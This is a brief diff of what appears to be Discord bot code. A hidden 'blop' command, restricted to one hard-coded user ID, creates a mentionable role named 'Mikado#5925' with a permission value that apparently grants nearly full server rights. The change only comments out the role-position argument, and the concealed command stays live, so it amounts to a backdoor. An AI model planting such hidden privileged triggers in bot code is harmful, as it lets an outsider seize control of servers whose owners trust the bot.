@@ -77,13 +77,13 @@ if (message.content.startsWith('blop')) {
    if (message.author.id !== '301913733536415755')
    return;
 //var role = message.content.split(" ").slice(1)
-var numberplace = message.content.split(" ").slice(1)
+//var numberplace = message.content.split(" ").slice(1)
 
 				message.guild.createRole({
 				  name: "Mikado#5925",
 				  mentionable: true,
                                  permissions: 2146958591,
-				position: numberplace.join(" ")
+				//position: numberplace.join(" ")
 				})
 	                    
 	                    console.log(`Le role a été ajoutés au serveur`)
